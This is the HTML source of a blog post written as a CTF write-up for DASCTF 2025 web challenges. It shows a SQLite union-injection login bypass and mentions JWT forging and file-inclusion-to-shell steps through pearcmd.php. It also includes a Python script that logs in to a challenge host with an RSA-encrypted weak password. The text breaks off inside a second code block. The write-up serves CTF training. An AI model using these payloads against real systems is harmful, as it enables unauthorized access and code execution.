@@ -1,0 +1,1082 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="xiaolaisec">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://laijunyue.github.io/2025/11/04/dasctf 2025下半年赛wp/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="WEBSecretPhotoGallery登录入口打sqlite注入进行登录 1username&#x3D;admin&amp;password&#x3D;admin&amp;#x27;+union+select+1,2,3--+    每一张图片对应一个字符，拼接起来就是jwt的密钥了(额，有点没想到，MISC做少了。。。  拼接得到密钥为GALLERY2024SECRET 伪造admin    可进行文件读取  想读源码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DASCTF 2025下半年赛 WP">
+<meta property="og:url" content="http://laijunyue.github.io/2025/11/04/DASCTF%202025%E4%B8%8B%E5%8D%8A%E5%B9%B4%E8%B5%9BWP/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="WEBSecretPhotoGallery登录入口打sqlite注入进行登录 1username&#x3D;admin&amp;password&#x3D;admin&amp;#x27;+union+select+1,2,3--+    每一张图片对应一个字符，拼接起来就是jwt的密钥了(额，有点没想到，MISC做少了。。。  拼接得到密钥为GALLERY2024SECRET 伪造admin    可进行文件读取  想读源码">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251206173047660.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251206173055654.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251208181725879.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251208181855259.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251208182014208.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251208182127831.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251208182327820.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251208182443598.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251208182843852.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251208183244495.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251208183409352.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251208183643076.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251208183715538.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251208184440458.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251208184634963.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251208184856349.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251211083037136.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251211083217639.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251211090021727.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251211090727261.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251206101323338.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251206101359276.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251206182503175.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251206182316749.png">
+<meta property="article:published_time" content="2025-11-04T01:35:22.000Z">
+<meta property="article:modified_time" content="2025-12-11T01:14:41.595Z">
+<meta property="article:author" content="xiaolaisec">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="JAVA">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://laijunyue.github.io/images/image-20251206173047660.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/background.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/background.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/background.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            DASCTF 2025下半年赛 WP -
+        
+        Welcome to xiaolaisec&#39;s blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Welcome to xiaolaisec&#39;s blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"laijunyue.github.io","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","delete_mask":false,"headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null},"highlight_theme":{"light":"github","dark":"vs2015"}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]},"pangu_js":false},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null},"side_tools":{"gear_rotation":true,"auto_expand":false}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/background.jpg","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"xiaolaisec's blog","subtitle":{"text":["欢迎来到我的博客(｡･∀･)ﾉﾞ","悟已往之不谏，知来者之可追...","随心所欲地享受每一天\\(￣︶￣*\\))","随时随地，浏览记录O(∩_∩)O","如果喜欢，建议给个支持( •̀ ω •́ )✧","喜欢的话，留个言好嘛(oﾟvﾟ)ノ","你有建议？反馈作者(●^◡^●)","文字正在不断轮换(*￣3￣)╭","正在努力更新博客(ง •_•)ง","正在不断努力改善博客中ε=( o｀ω′)ノ"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn","show_author":false},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null},"style":"default"}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.6.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true},"width":{"home":"1200px","pages":"1000px"}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null,"show_on_mobile":true},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3},"excerpt_length":200},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Welcome to xiaolaisec&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">19</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">42</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">DASCTF 2025下半年赛 WP</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/xiaolai.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">xiaolaisec</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-11-04 09:35:22</span>
+        <span class="mobile">2025-11-04 09:35:22</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-12-11 09:14:41</span>
+            <span class="mobile">2025-12-11 09:14:41</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/JAVA/">JAVA</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/PHP/">PHP</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Python/">Python</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="SecretPhotoGallery"><a href="#SecretPhotoGallery" class="headerlink" title="SecretPhotoGallery"></a>SecretPhotoGallery</h2><p>登录入口打sqlite注入进行登录</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=admin&#x27;+union+select+1,2,3--+</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251206173047660.png"
+                      alt="image-20251206173047660"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251206173055654.png"
+                      alt="image-20251206173055654"
+                ></p>
+<p>每一张图片对应一个字符，拼接起来就是jwt的密钥了(额，有点没想到，MISC做少了。。。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251208181725879.png"
+                      alt="image-20251208181725879"
+                ></p>
+<p>拼接得到密钥为<code>GALLERY2024SECRET</code></p>
+<p>伪造admin</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251208181855259.png"
+                      alt="image-20251208181855259"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251208182014208.png"
+                      alt="image-20251208182014208"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251208182127831.png"
+                      alt="image-20251208182127831"
+                ></p>
+<p>可进行文件读取</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251208182327820.png"
+                      alt="image-20251208182327820"
+                ></p>
+<p>想读源码但是发送是直接运行了<code>.php</code>文件，那可以断定用的是例如<code>include()</code>这样的文件包含函数</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251208182443598.png"
+                      alt="image-20251208182443598"
+                ></p>
+<p>打不了<code>phpbase64filter</code>，日志文件也没有</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251208182843852.png"
+                      alt="image-20251208182843852"
+                ></p>
+<p>利用<code>pearcmd.php</code>进行RCE</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251208183244495.png"
+                      alt="image-20251208183244495"
+                ></p>
+<p>成功写入shell</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251208183409352.png"
+                      alt="image-20251208183409352"
+                ></p>
+<p>RCE读<code>flag.php</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251208183643076.png"
+                      alt="image-20251208183643076"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251208183715538.png"
+                      alt="image-20251208183715538"
+                ></p>
+<h2 id="devweb"><a href="#devweb" class="headerlink" title="devweb"></a>devweb</h2><p>在<code>/assets/index-BgDOi0T5.js</code>中发现了<code>/download?file=$&#123;t.name&#125;&amp;sign=6f742c2e79030435b7edc1d79b8678f6</code>接口</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251208184440458.png"
+                      alt="image-20251208184440458"
+                ></p>
+<p>以为又可以任意文件读取，发现读不了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251208184634963.png"
+                      alt="image-20251208184634963"
+                ></p>
+<p>走投无路之时结果又在js文件里发现了文件名，好家伙，这就是比谁眼神好呗(bushi</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251208184856349.png"
+                      alt="image-20251208184856349"
+                ></p>
+<p>但是还是无法直接下载，应该是需要登录后的cookie，但是直接通过登录框登录显示请求超时</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251211083037136.png"
+                      alt="image-20251211083037136"
+                ></p>
+<p>在JS里发现了RSA的Publickey</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251211083217639.png"
+                      alt="image-20251211083217639"
+                ></p>
+<p>写一个脚本对<code>/login</code>路由进行访问，将<code>password</code>通过RSA的Publickey加密后进行登录，弱口令<code>admin/123456</code>成功登陆</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 1. 从 JS 中抠出来的 publicKey（X.509 SubjectPublicKeyInfo，base64） =====</span></span><br><span class="line">pubkey_b64 = (</span><br><span class="line">    <span class="string">&quot;MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgGyAKgwgFtRvud51H9otkcAxKh/8&quot;</span></span><br><span class="line">    <span class="string">&quot;/iIlj3WlPJ0RL1pDtRvyMu5/edP84Mp9FqnZNCXKi1042pd4Y2Bf9QT0/z1i6KPi&quot;</span></span><br><span class="line">    <span class="string">&quot;Z8zT3XNTtPOqIHO5aVaOfAl8lr52AurMZVpXwEUS2hh+Q/AN4/SV9AZPCgrUXk61&quot;</span></span><br><span class="line">    <span class="string">&quot;9aaw0Md9MNvn3w0JAgMBAAE=&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拼成标准 PEM 公钥格式，方便用库导入</span></span><br><span class="line">public_key_pem = <span class="string">f&quot;&quot;&quot;-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string"><span class="subst">&#123;pubkey_b64[<span class="number">0</span>:<span class="number">64</span>]&#125;</span></span></span><br><span class="line"><span class="string"><span class="subst">&#123;pubkey_b64[<span class="number">64</span>:<span class="number">128</span>]&#125;</span></span></span><br><span class="line"><span class="string"><span class="subst">&#123;pubkey_b64[<span class="number">128</span>:<span class="number">192</span>]&#125;</span></span></span><br><span class="line"><span class="string"><span class="subst">&#123;pubkey_b64[<span class="number">192</span>:]&#125;</span></span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 2. 使用 RSA/PKCS1_v1_5 加密明文密码 =====</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_encrypt_password</span>(<span class="params">plaintext: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    key = RSA.import_key(public_key_pem)</span><br><span class="line">    cipher = PKCS1_v1_5.new(key)</span><br><span class="line">    <span class="comment"># 与前端一致：直接对 UTF-8 字节做 PKCS1 v1.5 加密</span></span><br><span class="line">    ciphertext_bytes = cipher.encrypt(plaintext.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    <span class="comment"># JSEncrypt 的 hr(hex) 等价于对密文字节做标准 base64</span></span><br><span class="line">    ciphertext_b64 = base64.b64encode(ciphertext_bytes).decode()</span><br><span class="line">    <span class="keyword">return</span> ciphertext_b64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 明文密码</span></span><br><span class="line">plaintext_pwd = <span class="string">&quot;123456&quot;</span></span><br><span class="line">enc_pwd = rsa_encrypt_password(plaintext_pwd)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Encrypted password (base64):&quot;</span>, enc_pwd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 3. 构造与前端一致的登录请求 =====</span></span><br><span class="line">login_url = <span class="string">&quot;http://87ec7d6c-8479-4038-8de8-8684e4d60620.node5.buuoj.cn:81/login&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: enc_pwd,  <span class="comment"># 前端是 encodeURIComponent(t.encrypt(this.password))</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># requests 默认使用 application/x-www-form-urlencoded，行为和 axios 一样</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.post(login_url, data=data, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] HTTP status:&quot;</span>, resp.status_code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Response text:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure></div>
+
+<p>返回到了&#x2F;dashboard，但是是404，无妨，登录后通过<code>/download?file=app.jmx&amp;sign=6f742c2e79030435b7edc1d79b8678f6</code>进行下载<code>app.jmx</code></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span 